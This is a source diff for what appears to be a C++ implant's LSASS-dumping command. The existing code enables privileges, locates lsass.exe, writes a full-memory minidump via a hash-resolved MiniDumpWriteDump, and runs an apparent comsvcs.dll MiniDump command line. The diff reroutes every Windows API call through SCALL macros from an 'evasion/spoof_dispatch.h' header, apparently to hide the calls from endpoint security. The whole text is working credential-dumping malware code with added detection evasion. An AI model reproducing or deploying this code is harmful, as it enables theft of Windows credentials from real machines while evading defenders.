@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_LSASS_DUMP
 
@@ -59,7 +60,7 @@ static auto declfn enable_priv(
     const wchar_t* priv_name
 ) -> bool {
     HANDLE h_token = nullptr;
-    if ( !inst.advapi32.OpenProcessToken(
+    if ( !SCALL( inst, advapi32.OpenProcessToken,
             reinterpret_cast<HANDLE>( static_cast<LONG_PTR>( -1 ) ),
             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h_token ) )
         return false;
@@ -67,11 +68,11 @@ static auto declfn enable_priv(
     TOKEN_PRIVILEGES tp = {};
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    inst.advapi32.LookupPrivilegeValueW( nullptr, priv_name, &tp.Privileges[0].Luid );
-    inst.advapi32.AdjustTokenPrivileges( h_token, FALSE, &tp, sizeof(tp), nullptr, nullptr );
+    SCALL( inst, advapi32.LookupPrivilegeValueW, nullptr, priv_name, &tp.Privileges[0].Luid );
+    SCALL( inst, advapi32.AdjustTokenPrivileges, h_token, FALSE, &tp, sizeof(tp), nullptr, nullptr );
 
-    DWORD err = inst.kernel32.GetLastError();
-    inst.kernel32.CloseHandle( h_token );
+    DWORD err = (DWORD)SCALL( inst, kernel32.GetLastError );
+    SCALL( inst, kernel32.CloseHandle, h_token );
     return ( err == 0 );
 }
 
@@ -94,7 +95,7 @@ static auto declfn find_lsass_pid( instance& inst ) -> DWORD {
         return 0;
 
     // TH32CS_SNAPPROCESS = 0x00000002
-    HANDLE h_snap = pCreateToolhelp32Snapshot( 0x00000002, 0 );
+    HANDLE h_snap = (HANDLE)SCALL_PTR( inst, pCreateToolhelp32Snapshot, 0x00000002, 0 );
     if ( h_snap == INVALID_HANDLE_VALUE )
         return 0;
 
@@ -104,17 +105,17 @@ static auto declfn find_lsass_pid( instance& inst ) -> DWORD {
     DWORD lsass_pid = 0;
     char target[] = { 'l','s','a','s','s','.','e','x','e', 0 };
 
-    if ( pProcess32First( h_snap, &pe ) ) {
+    if ( SCALL_PTR( inst, pProcess32First, h_snap, &pe ) ) {
         do {
             if ( str_icmp( pe.szExeFile, target ) == 0 ) {
                 lsass_pid = pe.th32ProcessID;
                 break;
             }
             pe.dwSize = sizeof(PE32);
-        } while ( pProcess32Next( h_snap, &pe ) );
+        } while ( SCALL_PTR( inst, pProcess32Next, h_snap, &pe ) );
     }
 
-    inst.kernel32.CloseHandle( h_snap );
+    SCALL( inst, kernel32.CloseHandle, h_snap );
     return lsass_pid;
 }
 
@@ -126,7 +127,7 @@ static auto declfn do_minidump(
     DWORD lsass_pid
 ) -> void {
     // open lsass process
-    HANDLE h_lsass = inst.kernel32.OpenProcess(
+    HANDLE h_lsass = (HANDLE)SCALL( inst, kernel32.OpenProcess,
         PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsass_pid );
     if ( !h_lsass ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -136,9 +137,9 @@ static auto declfn do_minidump(
 
     // load dbghelp.dll
     STK_DBGHELP(_n);
-    HMODULE h_dbghelp = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    HMODULE h_dbghelp = reinterpret_cast<HMODULE>( SCALL( inst, kernel32.LoadLibraryA, _n ) );
     if ( !h_dbghelp ) {
-        inst.kernel32.CloseHandle( h_lsass );
+        SCALL( inst, kernel32.CloseHandle, h_lsass );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary dbghelp failed" ) ) );
         return;
@@ -148,14 +149,14 @@ static auto declfn do_minidump(
         resolve::_api( reinterpret_cast<uintptr_t>( h_dbghelp ),
             expr::hash_string( "MiniDumpWriteDump" ) ) );
     if ( !pMiniDumpWriteDump ) {
-        inst.kernel32.CloseHandle( h_lsass );
+        SCALL( inst, kernel32.CloseHandle, h_lsass );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "MiniDumpWriteDump not found" ) ) );
         return;
     }
 
     // create output file
-    HANDLE h_file = inst.kernel32.CreateFileA(
+    HANDLE h_file = (HANDLE)SCALL( inst, kernel32.CreateFileA,
         dump_path,
         GENERIC_WRITE,
         0,
@@ -164,20 +165,20 @@ static auto declfn do_minidump(
         FILE_ATTRIBUTE_NORMAL,
         nullptr );
     if ( h_file == INVALID_HANDLE_VALUE ) {
-        inst.kernel32.CloseHandle( h_lsass );
+        SCALL( inst, kernel32.CloseHandle, h_lsass );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CreateFileA dump path failed" ) ) );
         return;
     }
 
     // MiniDumpWithFullMemory = 0x00000002
-    BOOL ok = pMiniDumpWriteDump(
+    BOOL ok = (BOOL)SCALL_PTR( inst, pMiniDumpWriteDump,
         h_lsass, lsass_pid, h_file,
         0x00000002,
         nullptr, nullptr, nullptr );
 
-    inst.kernel32.CloseHandle( h_file );
-    inst.kernel32.CloseHandle( h_lsass );
+    SCALL( inst, kernel32.CloseHandle, h_file );
+    SCALL( inst, kernel32.CloseHandle, h_lsass );
 
     if ( !ok ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -213,7 +214,7 @@ static auto declfn do_comsvcs(
     str_concat( cmdline, symbol<char*>( const_cast<char*>( " full" ) ) );
 
     wchar_t wcmdline[512] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmdline, -1, wcmdline, 512 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, cmdline, -1, wcmdline, 512 );
 
     STARTUPINFOW si = {};
     si.cb          = sizeof( STARTUPINFOW );
@@ -222,7 +223,7 @@ static auto declfn do_comsvcs(
 
     PROCESS_INFORMATION pi = {};
 
-    BOOL ok = inst.kernel32.CreateProcessW(
+    BOOL ok = (BOOL)SCALL( inst, kernel32.CreateProcessW,
         nullptr, wcmdline,
         nullptr, nullptr,
         FALSE,
@@ -236,7 +237,7 @@ static auto declfn do_comsvcs(
         return;
     }
 
-    inst.kernel32.WaitForSingleObject( pi.hProcess, 30000 );
+    SCALL( inst, kernel32.WaitForSingleObject, pi.hProcess, 30000 );
 
     DWORD exit_code = 1;
     typedef BOOL (WINAPI *fn_GetExitCodeProcess)( HANDLE, LPDWORD );
@@ -245,10 +246,10 @@ static auto declfn do_comsvcs(
             reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
             expr::hash_string( "GetExitCodeProcess" ) ) );
     if ( pGetExitCodeProcess )
-        pGetExitCodeProcess( pi.hProcess, &exit_code );
+        SCALL_PTR( inst, pGetExitCodeProcess, pi.hProcess, &exit_code );
 
-    inst.kernel32.CloseHandle( pi.hThread );
-    inst.kernel32.CloseHandle( pi.hProcess );
+    SCALL( inst, kernel32.CloseHandle, pi.hThread );
+    SCALL( inst, kernel32.CloseHandle, pi.hProcess );
 
     if ( exit_code != 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
